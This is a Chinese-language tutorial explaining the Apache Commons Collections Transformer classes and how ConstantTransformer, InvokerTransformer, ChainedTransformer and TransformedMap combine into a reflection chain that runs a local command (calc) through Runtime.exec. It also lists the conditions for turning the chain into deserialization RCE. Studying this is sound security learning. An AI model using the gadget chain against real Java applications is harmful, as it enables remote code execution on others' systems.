## Transformer

Transformer`是一个接口类，提供了一个对象转换方法`transform

```java
public interface Transformer {

    /**
     * 将输入对象（保持不变）转换为某个输出对象。
     *
     * @param input  需要转换的对象，应保持不变
     * @return 一个已转换的对象
     * @throws ClassCastException (runtime) 如果输入是错误的类
     * @throws IllegalArgumentException (runtime) 如果输入无效
     * @throws FunctorException (runtime) 如果转换无法完成
     */
    public Object transform(Object input);

}
```

该接口的重要实现类有：`ConstantTransformer`、`invokerTransformer`、`ChainedTransformer`、`TransformedMap` 。

### ConstantTransformer

对Transformer的实现类，重写了transform方法

ConstantTransformer`，常量转换，转换的逻辑也非常的简单：传入对象不会经过任何改变直接返回。例如传入`Runtime.class`进行转换返回的依旧是`Runtime.class

```java
package org.example;

import org.apache.commons.collections.functors.ConstantTransformer;

public class ConstantTransformerTest {

    public static void main(String[] args) {
        Object obj = Runtime.class;
        ConstantTransformer transformer = new ConstantTransformer(obj);
        System.out.println(transformer.transform(obj));
    }

}
```

### InvokerTransformer

这个类实现了`java.io.Serializable`接口。`InvokerTransformer`类`transform`方法实现了类方法动态调用，即采用反射机制动态调用类方法（反射方法名、参数值均可控）并返回该方法执行结果。

```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }

    public Object transform(Object input) {
        if (input == null) {
            return null;
        }

        try {
              // 获取输入类的类对象
            Class cls = input.getClass();

              // 通过输入的方法名和方法参数，获取指定的反射方法对象
            Method method = cls.getMethod(iMethodName, iParamTypes);

              // 反射调用指定的方法并返回方法调用结果
            return method.invoke(input, iArgs);
        } catch (Exception ex) {
            // 省去异常处理部分代码
        }
```

使用该类来执行本地命令

```java
package org.example;

import org.apache.commons.collections.functors.InvokerTransformer;

public class InvokerTransformerTest {

    public static void main(String[] args) {
        // 定义需要执行的本地系统命令
        String cmd = "calc";

        // 构建transformer对象
        InvokerTransformer transformer = new InvokerTransformer(
                "exec", new Class[]{String.class}, new Object[]{cmd}  //方法名为exec,方法参数类型的数组，实际参数值的数组
        );

        // 传入Runtime实例，执行对象转换操作
        transformer.transform(Runtime.getRuntime());
    }
}
```

### ChainedTransformer

`org.apache.commons.collections.functors.ChainedTransformer`类封装了`Transformer`的链式调用，我们只需要传入一个`Transformer`数组，`ChainedTransformer`就会依次调用每一个`Transformer`的`transform`方法。

示例代码

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class ChainedTransformerTest {

    public static void main(String[] args){
        String cmd = "calc";

        Transformer[] transformers =new Transformer[]{
                new ConstantTransformer(Runtime.class),
                //返回Runtime.class作为第一个Invoker的Input
                //Class runtimeClass = Runtime.class;
                new InvokerTransformer("getMethod" ,new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                ),
                //Class cls1 = runtimeClass.getClass(); 没有变化，还是相当于Runtime这个类的对象Runtime.class
                //Method getMethod = cls1.getMethod("getMethod",.......................)创建了getMethod这个方法的对象
                //Method getRuntime = getMethod.invoke(runtimeClass,.......................)这里获取到了getRuntime这个方法
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class},new Object[]{null,new Object[0]}
    ),
                //Class cls2 = getRuntime.getClass();获取的是Method这个公共API的对象
                //Method InvokeMethod =cls2.getMethod("invoke",....................)获取到了invoke方法
                //Runtime runtime = (Runtime) InvokeMethod.invoke(getRuntime, new Object[]{null, new Class[0]}) 获取到了Runtime对象实例
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{cmd})
        };
                //Class cls3 = runtime.getClass();
                //Method execMethod = cls3.getMethod("exec",..........)获取exec方法
                //execMethod.invoke(runtime,cmd)执行cmd

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //创建调用链对象
        Object transform = chainedTransformer.transform(null);
        //执行对象转化
        System.out.println(transform);
    }

}
```

## 利用`InvokerTransformer`执行本地命令

org.apache.commons.collections.map.TransformedMap`类间接的实现了`java.util.Map`接口，同时支持对`Map`的`key`或者`value`进行`Transformer`转换，调用`decorate`和`decorateTransform`方法就可以创建一个`TransformedMap

```java
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
      return new TransformedMap(map, keyTransformer, valueTransformer);
}

public static Map decorateTransform(Map map, Transformer keyTransformer, Transformer valueTransformer) {
      // 省去实现代码
}
```

只要调用`TransformedMap`的`setValue/put/putAll`中的任意方法都会调用`InvokerTransformer`类的`transform`方法，从而也就会触发命令执行。

在ChainedTransformerTest代码中添加如下部分

```java
        // 创建Map对象
        Map map = new HashMap();
        map.put("value", "value");

        // 使用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象
        Map transformedMap = TransformedMap.decorate(map, null, transformedChain);

        // transformedMap.put("v1", "v2");// 执行put也会触发transform

        // 遍历Map元素，并调用setValue方法
        for (Object obj : transformedMap.entrySet()) {
            Map.Entry entry = (Map.Entry) obj;

            // setValue最终调用到InvokerTransformer的transform方法,从而触发Runtime命令执行调用链
            entry.setValue("test");
        }

        System.out.println(transformedMap);
```

意思是我们不需要再手动执行对象转化，转而使用serValue/put/putAll方法来实现

> 任意类rce条件
>
> 1. 实现了`java.io.Serializable`接口；
> 2. 并且可以传入我们构建的`TransformedMap`对象；
> 3. 调用了`TransformedMap`中的`setValue/put/putAll`中的任意方法一个方法的类

> 为什么要实现序列化的接口？
>
>  只有实现了 `java.io.Serializable` 接口的对象才能被序列化和反序列化。我们需要一个反序列化入口，并且还要序列化恶意类